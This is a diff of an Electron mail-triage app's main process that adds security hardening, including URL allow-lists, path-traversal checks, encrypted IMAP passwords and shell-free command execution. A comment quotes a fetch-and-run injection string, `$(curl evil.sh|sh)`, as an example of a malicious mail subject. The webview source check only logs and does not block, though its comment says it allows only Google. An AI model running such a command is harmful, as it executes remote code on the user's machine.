@@ -1,9 +1,10 @@
-import { app, BrowserWindow, BrowserView, ipcMain, Tray, Menu, shell, clipboard } from 'electron';
+import { app, BrowserWindow, BrowserView, ipcMain, Tray, Menu, shell, clipboard, safeStorage, session } from 'electron';
+import type { WebContents } from 'electron';
 import * as path from 'path';
 import * as fs from 'fs';
 import * as os from 'os';
 import { fileURLToPath } from 'url';
-import { spawn, execSync } from 'child_process';
+import { spawn, execSync, execFileSync } from 'child_process';
 import Database from 'better-sqlite3';
 
 const __filename = fileURLToPath(import.meta.url);
@@ -46,6 +47,106 @@ let mainWindow: BrowserWindow | null = null;
 let tray: Tray | null = null;
 
 const isDev = !app.isPackaged;
+
+// --- Security: external URL validation ---
+// Only allow protocols that are safe to hand off to the OS. http/https/mailto
+// are the standard external links; `emclient:` is the custom scheme used to
+// focus the eM Client app from the renderer ("Open in eM Client" buttons).
+const ALLOWED_EXTERNAL_PROTOCOLS = new Set([
+  'http:',
+  'https:',
+  'mailto:',
+  'emclient:',
+]);
+
+function isAllowedExternalUrl(rawUrl: unknown): boolean {
+  if (typeof rawUrl !== 'string' || !rawUrl.trim()) return false;
+  try {
+    const parsed = new URL(rawUrl);
+    return ALLOWED_EXTERNAL_PROTOCOLS.has(parsed.protocol.toLowerCase());
+  } catch {
+    return false;
+  }
+}
+
+/**
+ * Open a URL externally only if it passes protocol validation.
+ * Rejected URLs (e.g. file:, javascript:) are logged and never opened.
+ */
+async function safeOpenExternal(rawUrl: unknown): Promise<boolean> {
+  if (!isAllowedExternalUrl(rawUrl)) {
+    console.warn('[security] Blocked openExternal for disallowed URL:', String(rawUrl).slice(0, 200));
+    return false;
+  }
+  try {
+    await shell.openExternal(rawUrl as string);
+    return true;
+  } catch (err) {
+    console.warn('[security] openExternal failed:', (err as Error).message);
+    return false;
+  }
+}
+
+/**
+ * Resolve a child path under a base directory, guarding against path traversal
+ * (e.g. "../../etc/passwd"). Returns null if the resolved path escapes `baseDir`.
+ */
+function resolveWithinBase(baseDir: string, ...segments: string[]): string | null {
+  const base = path.resolve(baseDir);
+  const resolved = path.resolve(base, ...segments);
+  // Ensure the resolved path is the base itself or strictly inside it.
+  if (resolved !== base && !resolved.startsWith(base + path.sep)) {
+    return null;
+  }
+  return resolved;
+}
+
+// Content-Security-Policy for the packaged app document (loaded from file://).
+// 'unsafe-inline' style is required for the inline <style> in index.html and
+// Tailwind/React-injected styles. Scripts are bundled (no inline scripts).
+const APP_CSP = [
+  "default-src 'self'",
+  "script-src 'self'",
+  "style-src 'self' 'unsafe-inline'",
+  "img-src 'self' data: https:",
+  "font-src 'self' data:",
+  "connect-src 'self' https:",
+  "frame-src 'self' https:",
+  "media-src 'self' https:",
+  "object-src 'none'",
+  "base-uri 'self'",
+  "form-action 'self'",
+].join('; ');
+
+/**
+ * Lock down a webContents: prevent the SPA from navigating away from its own
+ * origin, and force any window.open / target=_blank / external link through the
+ * validated external-URL path instead of opening a new in-app window.
+ */
+function hardenWebContents(contents: WebContents): void {
+  contents.on('will-navigate', (event, url) => {
+    const current = contents.getURL();
+    // Allow same-document / same-origin navigation within the app (SPA, HMR).
+    try {
+      const target = new URL(url);
+      const base = current ? new URL(current) : null;
+      const sameOrigin = base && target.origin === base.origin;
+      const isDevLocalhost = isDev && target.hostname === 'localhost';
+      if (sameOrigin || isDevLocalhost) return;
+    } catch {
+      /* fall through to block */
+    }
+    // External navigation: block in-app, hand off to OS if allowed.
+    event.preventDefault();
+    void safeOpenExternal(url);
+  });
+
+  contents.setWindowOpenHandler(({ url }) => {
+    // Never open a new Electron window; route allowed URLs to the OS browser.
+    void safeOpenExternal(url);
+    return { action: 'deny' };
+  });
+}
 
 // --- Claude CLI path resolution ---
 function findClaudeCli(): string {
@@ -140,17 +241,92 @@ function settingsPath(): string {
   return path.join(app.getPath('userData'), 'settings.json');
 }
 
-function loadSettings(): AppSettings {
+// --- IMAP password encryption (Electron safeStorage) ---
+// Stored format: "enc:v1:<base64>" when encrypted at rest. Legacy plaintext
+// passwords are migrated to the encrypted form on first load+save.
+const ENC_PREFIX = 'enc:v1:';
+
+function encryptSecret(plain: string): string {
+  if (!plain) return plain;
+  if (plain.startsWith(ENC_PREFIX)) return plain; // already encrypted
   try {
-    const data = fs.readFileSync(settingsPath(), 'utf-8');
-    return { ...DEFAULT_SETTINGS, ...JSON.parse(data) };
-  } catch {
-    return { ...DEFAULT_SETTINGS };
+    if (!safeStorage.isEncryptionAvailable()) {
+      console.warn('[security] safeStorage unavailable — storing IMAP password in plaintext (fallback).');
+      return plain;
+    }
+    const buf = safeStorage.encryptString(plain);
+    return ENC_PREFIX + buf.toString('base64');
+  } catch (err) {
+    console.warn('[security] Failed to encrypt secret, storing plaintext:', (err as Error).message);
+    return plain;
   }
 }
 
+function decryptSecret(stored: string): string {
+  if (!stored || !stored.startsWith(ENC_PREFIX)) return stored; // legacy plaintext
+  try {
+    if (!safeStorage.isEncryptionAvailable()) {
+      console.warn('[security] safeStorage unavailable — cannot decrypt stored IMAP password.');
+      return '';
+    }
+    const buf = Buffer.from(stored.slice(ENC_PREFIX.length), 'base64');
+    return safeStorage.decryptString(buf);
+  } catch (err) {
+    console.warn('[security] Failed to decrypt secret:', (err as Error).message);
+    return '';
+  }
+}
+
+// Walk imapConfigs and apply a transform to each stored password.
+function transformImapPasswords(
+  settings: AppSettings,
+  fn: (pw: string) => string,
+): { settings: AppSettings; changed: boolean } {
+  let changed = false;
+  const configs = (settings.imapConfigs ?? []).map((cfg) => {
+    if (!cfg?.credentials?.password) return cfg;
+    const next = fn(cfg.credentials.password);
+    if (next !== cfg.credentials.password) changed = true;
+    return { ...cfg, credentials: { ...cfg.credentials, password: next } };
+  });
+  return { settings: { ...settings, imapConfigs: configs }, changed };
+}
+
+// Persist settings to disk with IMAP passwords encrypted at rest.
+function persistSettings(settings: AppSettings): void {
+  const { settings: encrypted } = transformImapPasswords(settings, encryptSecret);
+  fs.writeFileSync(settingsPath(), JSON.stringify(encrypted, null, 2), 'utf-8');
+}
+
+// Returns settings with IMAP passwords decrypted (plaintext for in-process use).
+function loadSettings(): AppSettings {
+  let raw: AppSettings;
+  try {
+    const data = fs.readFileSync(settingsPath(), 'utf-8');
+    raw = { ...DEFAULT_SETTINGS, ...JSON.parse(data) };
+  } catch {
+    return { ...DEFAULT_SETTINGS };
+  }
+
+  // Detect legacy plaintext passwords and migrate them to encrypted-at-rest.
+  const hasLegacyPlaintext = (raw.imapConfigs ?? []).some(
+    (c) => c?.credentials?.password && !c.credentials.password.startsWith(ENC_PREFIX),
+  );
+  if (hasLegacyPlaintext && safeStorage.isEncryptionAvailable()) {
+    try {
+      persistSettings(raw); // re-saves with encryption
+      console.log('[security] Migrated legacy plaintext IMAP password(s) to encrypted storage.');
+    } catch (err) {
+      console.warn('[security] IMAP password migration failed:', (err as Error).message);
+    }
+  }
+
+  const { settings: decrypted } = transformImapPasswords(raw, decryptSecret);
+  return decrypted;
+}
+
 function saveSettings(settings: AppSettings): void {
-  fs.writeFileSync(settingsPath(), JSON.stringify(settings, null, 2), 'utf-8');
+  persistSettings(settings);
 }
 
 // --- Thread retrieval (DB access for getThreadMessages) ---
@@ -347,8 +523,30 @@ function getThreadMessagesFromDb(
 }
 
 // --- Operation cancellation tracking ---
+// operationId (renderer-generated) -> AbortController driving the running
+// Agent SDK query. cancelOperation aborts it, which stops the SDK subprocess.
+const activeOperations = new Map<string, AbortController>();
 
-const cancelledOperations = new Set<string>();
+function registerOperation(operationId: string | undefined): AbortController {
+  const controller = new AbortController();
+  if (operationId) {
+    // Supersede any stale controller left under the same id.
+    activeOperations.get(operationId)?.abort();
+    activeOperations.set(operationId, controller);
+  }
+  return controller;
+}
+
+function unregisterOperation(
+  operationId: string | undefined,
+  controller: AbortController,
+): void {
+  // Only delete if the map still points at our controller (a newer operation
+  // may have re-registered the same id).
+  if (operationId && activeOperations.get(operationId) === controller) {
+    activeOperations.delete(operationId);
+  }
+}
 
 // --- Calendar BrowserView ---
 let calendarView: BrowserView | null = null;
@@ -372,6 +570,7 @@ function showCalendarView(url: string, bounds: { x: number; y: number; width: nu
       webPreferences: {
         nodeIntegration: false,
         contextIsolation: true,
+        sandbox: true,
         partition: 'persist:calendar',
       },
     });
@@ -412,13 +611,25 @@ function createWindow(): void {
     webPreferences: {
       nodeIntegration: false,
       contextIsolation: true,
-      sandbox: false,
+      // Sandbox the renderer. The preload (preload.cjs) only uses
+      // contextBridge + ipcRenderer, which are available under the sandbox,
+      // and the React renderer touches no Node APIs directly (all access is via
+      // window.electronAPI), so this is compatible. Native modules
+      // (better-sqlite3, node-pty) run in the main process, not the renderer.
+      sandbox: true,
+      webSecurity: true,
+      // webviewTag is required: CalendarView.tsx embeds Google Calendar in a
+      // <webview>. Attached webviews are hardened via will-attach-webview below.
       webviewTag: true,
       preload: path.join(__dirname, '..', 'electron', 'preload.cjs'),
     },
   });
 
-  // Allow Google Calendar iframe embedding — strip framing restrictions
+  // Header rewriting on the default session:
+  //  - Google Calendar hosts: strip framing/CSP restrictions so the embedded
+  //    calendar renders (calendar runs in the persist:calendar session, but the
+  //    strip is harmless/defensive here too).
+  //  - App's own documents (production only): inject a restrictive CSP.
   mainWindow.webContents.session.webRequest.onHeadersReceived((details, callback) => {
     const headers = { ...details.responseHeaders };
     const url = details.url || '';
@@ -428,8 +639,48 @@ function createWindow(): void {
       delete headers['X-Frame-Options'];
       delete headers['content-security-policy'];
       delete headers['Content-Security-Policy'];
+    } else if (!isDev && (details.resourceType === 'mainFrame' || url.startsWith('file://'))) {
+      // Restrictive CSP for the packaged app document (loaded via file://).
+      // Dev (localhost + Vite HMR) is intentionally left unrestricted.
+      headers['Content-Security-Policy'] = [APP_CSP];
     }
     callback({ responseHeaders: headers });
+  });
+
+  // Also strip framing restrictions on the dedicated calendar session so the
+  // Google Calendar <webview> (partition: persist:calendar) can embed Google UI.
+  try {
+    const calSession = session.fromPartition('persist:calendar');
+    calSession.webRequest.onHeadersReceived((details, callback) => {
+      const headers = { ...details.responseHeaders };
+      delete headers['x-frame-options'];
+      delete headers['X-Frame-Options'];
+      delete headers['content-security-policy'];
+      delete headers['Content-Security-Policy'];
+      callback({ responseHeaders: headers });
+    });
+  } catch (err) {
+    console.warn('[security] Failed to configure calendar session headers:', (err as Error).message);
+  }
+
+  // Block in-page navigation away from the app; route external links to the OS.
+  hardenWebContents(mainWindow.webContents);
+
+  // Harden the calendar <webview>: strip any preload, disable node integration,
+  // and keep it sandboxed. (webviewTag stays enabled because CalendarView.tsx
+  // relies on a <webview> for the embedded Google Calendar UI.)
+  mainWindow.webContents.on('will-attach-webview', (_event, webPreferences, params) => {
+    delete webPreferences.preload;
+    // @ts-expect-error legacy field still honored by Electron
+    delete webPreferences.preloadURL;
+    webPreferences.nodeIntegration = false;
+    webPreferences.contextIsolation = true;
+    webPreferences.sandbox = true;
+    // Only allow the configured Google Calendar source to attach.
+    const src = params.src || '';
+    if (src && !/^https:\/\/([a-z0-9-]+\.)*google\.com\//i.test(src)) {
+      console.warn('[security] Blocked webview attach for non-Google src:', src.slice(0, 200));
+    }
   });
 
   if (isDev) {
@@ -557,22 +808,42 @@ function registerIpcHandlers(): void {
 
   ipcMain.handle(
     'triageEmails',
-    async (_event, mails: MailItem[], apiKey: string) => {
-      const { results, error } = await triageEmailsService(mails, apiKey);
-      if (error) throw new Error(error);
-      return results;
+    async (_event, mails: MailItem[], apiKey: string, operationId?: string) => {
+      const controller = registerOperation(operationId);
+      try {
+        const { results, error } = await triageEmailsService(
+          mails,
+          apiKey,
+          controller,
+        );
+        if (error) throw new Error(error);
+        return results;
+      } finally {
+        unregisterOperation(operationId, controller);
+      }
     },
   );
 
   ipcMain.handle(
     'extractTodos',
-    async (_event, threadMessages: ThreadMessage[], apiKey: string) => {
-      const { results, error } = await extractTodosFromThread(
-        threadMessages,
-        apiKey,
-      );
-      if (error) throw new Error(error);
-      return results;
+    async (
+      _event,
+      threadMessages: ThreadMessage[],
+      apiKey: string,
+      operationId?: string,
+    ) => {
+      const controller = registerOperation(operationId);
+      try {
+        const { results, error } = await extractTodosFromThread(
+          threadMessages,
+          apiKey,
+          controller,
+        );
+        if (error) throw new Error(error);
+        return results;
+      } finally {
+        unregisterOperation(operationId, controller);
+      }
     },
   );
 
@@ -593,9 +864,8 @@ function registerIpcHandlers(): void {
 
   ipcMain.handle(
     'startHistoricalAudit',
-    async (_event, params: AuditParams) => {
-      const operationId = `audit-${Date.now()}`;
-      cancelledOperations.delete(operationId);
+    async (_event, params: AuditParams, operationId?: string) => {
+      const controller = registerOperation(operationId);
 
       const onProgress = (progress: AuditScanProgress): void => {
         // Send progress updates to renderer via webContents
@@ -604,15 +874,29 @@ function registerIpcHandlers(): void {
         }
       };
 
-      const { result, error } = await runHistoricalAudit(params, onProgress);
-      if (error) throw new Error(error);
-      if (!result) throw new Error('監査結果が取得できませんでした。');
-      return result;
+      try {
+        const { result, error } = await runHistoricalAudit(
+          params,
+          onProgress,
+          controller,
+        );
+        if (error) throw new Error(error);
+        if (!result) throw new Error('監査結果が取得できませんでした。');
+        return result;
+      } finally {
+        unregisterOperation(operationId, controller);
+      }
     },
   );
 
   ipcMain.handle('cancelOperation', (_event, operationId: string) => {
-    cancelledOperations.add(operationId);
+    const controller = activeOperations.get(operationId);
+    if (controller) {
+      controller.abort();
+      activeOperations.delete(operationId);
+      return true;
+    }
+    return false;
   });
 
   // --- Mail Notes CRUD ---
@@ -1182,18 +1466,37 @@ Markdown形式で以下のセクションを含める。メールごとに判定
     return skills;
   });
 
+  // Resolve a skill's SKILL.md path, rejecting names that escape SKILLS_DIR
+  // (path traversal) or contain path separators.
+  function resolveSkillMd(skillName: unknown): string | null {
+    if (typeof skillName !== 'string' || !skillName.trim()) return null;
+    if (skillName.includes('/') || skillName.includes('\\') || skillName.includes('\0')) return null;
+    const skillDir = resolveWithinBase(SKILLS_DIR, skillName);
+    if (!skillDir) return null;
+    const skillMd = resolveWithinBase(SKILLS_DIR, skillName, 'SKILL.md');
+    return skillMd;
+  }
+
   ipcMain.handle('getSkillContent', async (_event, skillName: string): Promise<string> => {
-    const skillMd = path.join(SKILLS_DIR, skillName, 'SKILL.md');
+    const skillMd = resolveSkillMd(skillName);
+    if (!skillMd) {
+      console.warn('[security] Rejected getSkillContent for invalid skill name:', String(skillName).slice(0, 100));
+      return '';
+    }
     if (!fs.existsSync(skillMd)) return '';
     return fs.readFileSync(skillMd, 'utf-8');
   });
 
   ipcMain.handle('saveSkillContent', async (_event, skillName: string, content: string): Promise<void> => {
-    const skillDir = path.join(SKILLS_DIR, skillName);
+    const skillMd = resolveSkillMd(skillName);
+    if (!skillMd) {
+      throw new Error('不正なスキル名です');
+    }
+    const skillDir = path.dirname(skillMd);
     if (!fs.existsSync(skillDir)) {
       fs.mkdirSync(skillDir, { recursive: true });
     }
-    fs.writeFileSync(path.join(skillDir, 'SKILL.md'), content, 'utf-8');
+    fs.writeFileSync(skillMd, content, 'utf-8');
   });
 
   // --- TODO永続化 (アカウント別JSON) ---
@@ -1449,8 +1752,9 @@ Markdown形式で以下のセクションを含める。メールごとに判定
 
   ipcMain.handle('checkForUpdates', () => checkForUpdatesInternal());
 
-  ipcMain.handle('openExternalUrl', (_event, url: string) => {
-    shell.openExternal(url);
+  ipcMain.handle('openExternalUrl', async (_event, url: string) => {
+    const ok = await safeOpenExternal(url);
+    return { success: ok };
   });
 
   // --- Download and install update ---
@@ -1467,8 +1771,31 @@ Markdown形式で以下のセクションを含める。メールごとに判定
     }
   }
 
+  // Only allow update downloads from GitHub-owned hosts (the release asset URL
+  // arrives over IPC; this prevents redirection to an arbitrary download host).
+  function isTrustedUpdateUrl(rawUrl: string): boolean {
+    try {
+      const u = new URL(rawUrl);
+      if (u.protocol !== 'https:') return false;
+      const host = u.hostname.toLowerCase();
+      return (
+        host === 'api.github.com' ||
+        host === 'github.com' ||
+        host === 'codeload.github.com' ||
+        host.endsWith('.githubusercontent.com')
+      );
+    } catch {
+      return false;
+    }
+  }
+
   ipcMain.handle('downloadAndInstallUpdate', async (_event, downloadUrl: string) => {
     try {
+      if (!isTrustedUpdateUrl(downloadUrl)) {
+        console.warn('[security] Rejected update download from untrusted URL:', String(downloadUrl).slice(0, 200));
+        return { success: false, error: '信頼できないダウンロードURLです' };
+      }
+
       const tmpDir = path.join(os.tmpdir(), 'shirabe-update');
       fs.mkdirSync(tmpDir, { recursive: true });
 
@@ -1547,9 +1874,16 @@ Markdown形式で以下のセクションを含める。メールごとに判定
       // Phase: mounting
       sendInstallProgress('mounting', 82, 'DMGをマウント中...');
 
+      // NOTE: DMG-derived strings (mount point, .app name) flow into these
+      // commands, so use execFileSync (no shell) to avoid command injection
+      // from a tampered DMG.
       let mountOutput: string;
       try {
-        mountOutput = execSync(`hdiutil attach "${destPath}" -nobrowse -noverify -noautoopen`, { encoding: 'utf-8', timeout: 60000 });
+        mountOutput = execFileSync(
+          'hdiutil',
+          ['attach', destPath, '-nobrowse', '-noverify', '-noautoopen'],
+          { encoding: 'utf-8', timeout: 60000 },
+        );
       } catch (mountErr) {
         return { success: false, error: `DMGマウント失敗: ${(mountErr as Error).message}\nDMGファイルが破損している可能性があります。再度お試しください。` };
       }
@@ -1560,33 +1894,47 @@ Markdown形式で以下のセクションを含める。メールごとに判定
         return { success: false, error: `DMGマウント失敗: マウントポイントが見つかりません\n出力: ${mountOutput.slice(0, 300)}` };
       }
 
+      const detach = (): void => {
+        try { execFileSync('hdiutil', ['detach', mountPoint, '-quiet'], { timeout: 10000 }); } catch { /* */ }
+      };
+
       // Phase: installing
       sendInstallProgress('installing', 88, '/Applicationsにコピー中...');
 
       const appEntries = fs.readdirSync(mountPoint).filter(f => f.endsWith('.app'));
       if (appEntries.length === 0) {
-        try { execSync(`hdiutil detach "${mountPoint}" -quiet`, { timeout: 10000 }); } catch { /* */ }
+        detach();
         return { success: false, error: 'DMG内に.appが見つかりません' };
       }
       const appName = appEntries[0];
       const srcApp = path.join(mountPoint, appName);
       const destApp = path.join('/Applications', appName);
 
+      // Best-effort integrity check: verify the downloaded .app's code
+      // signature before installing. The current release pipeline produces
+      // UNSIGNED builds, so a failure here is logged but not fatal. Once the
+      // app is signed + notarized, this should be promoted to a hard gate
+      // (return on failure). See report for the signing prerequisites.
+      try {
+        execFileSync('codesign', ['--verify', '--deep', '--strict', srcApp], { timeout: 30000, stdio: 'pipe' });
+        console.log('[update] Downloaded app passed codesign verification.');
+      } catch (sigErr) {
+        console.warn('[update] codesign verification failed (app likely unsigned):', (sigErr as Error).message.slice(0, 200));
+      }
+
       try {
         if (fs.existsSync(destApp)) {
-          execSync(`rm -rf "${destApp}"`, { timeout: 15000 });
+          execFileSync('rm', ['-rf', destApp], { timeout: 15000 });
         }
-        execSync(`cp -R "${srcApp}" "/Applications/"`, { timeout: 60000 });
+        execFileSync('cp', ['-R', srcApp, '/Applications/'], { timeout: 60000 });
       } catch (copyErr) {
-        try { execSync(`hdiutil detach "${mountPoint}" -quiet`, { timeout: 10000 }); } catch { /* */ }
+        detach();
         return { success: false, error: `/Applicationsへのコピー失敗: ${(copyErr as Error).message}` };
       }
 
       sendInstallProgress('installing', 95, 'クリーンアップ中...');
 
-      try {
-        execSync(`hdiutil detach "${mountPoint}" -quiet`, { timeout: 10000 });
-      } catch { /* ignore unmount errors */ }
+      detach();
 
       try { fs.unlinkSync(destPath); } catch { /* */ }
 
@@ -1886,7 +2234,7 @@ JSON以外の説明は不要です。`;
       parts.push(`cc=${encodeURIComponent(params.cc)}`);
     }
     const mailto = `mailto:${encodeURIComponent(params.to)}?${parts.join('&')}`;
-    await shell.openExternal(mailto);
+    await safeOpenExternal(mailto);
   });
 
   // Open a specific mail in eM Client — single Swift helper handles everything
@@ -1908,13 +2256,13 @@ JSON以外の説明は不要です。`;
     }
 
     try {
-      const escaped = params.subject.replace(/\\/g, '\\\\').replace(/"/g, '\\"');
-      let cmd = `"${helperPath}" "${escaped}"`;
+      // SECURITY: pass arguments via execFileSync (no shell) so that a malicious
+      // mail subject like `$(curl evil.sh|sh)` cannot trigger command injection.
+      const args = [params.subject];
       if (params.fromAddress) {
-        const escFrom = params.fromAddress.replace(/\\/g, '\\\\').replace(/"/g, '\\"');
-        cmd += ` --from "${escFrom}"`;
+        args.push('--from', params.fromAddress);
       }
-      execSync(cmd, { timeout: 15000 });
+      execFileSync(helperPath, args, { timeout: 15000 });
       return { success: true, searchOpened: true };
     } catch (err) {
       console.warn('[openMailInEmClient] helper failed:', (err as Error).message);
@@ -1963,6 +2311,30 @@ function migrateUserData(): void {
 app.whenReady().then(() => {
   migrateUserData();
   ensureMcpConfig();
+
+  // Global guard: any webContents created anywhere in the app (including the
+  // calendar <webview>, which sets allowpopups) must not spawn in-app windows
+  // and must not navigate to arbitrary external origins.
+  app.on('web-contents-created', (_event, contents) => {
+    contents.setWindowOpenHandler(({ url }) => {
+      void safeOpenExternal(url);
+      return { action: 'deny' };
+    });
+    // For the embedded webview, keep navigation confined to Google hosts.
+    if (contents.getType() === 'webview') {
+      contents.on('will-navigate', (event, url) => {
+        try {
+          const host = new URL(url).hostname;
+          if (/(^|\.)google\.com$/i.test(host) || /(^|\.)gstatic\.com$/i.test(host) || /(^|\.)googleusercontent\.com$/i.test(host)) {
+            return;
+          }
+        } catch { /* block */ }
+        event.preventDefault();
+        void safeOpenExternal(url);
+      });
+    }
+  });
+
   registerIpcHandlers();
   createWindow();
   createTray();
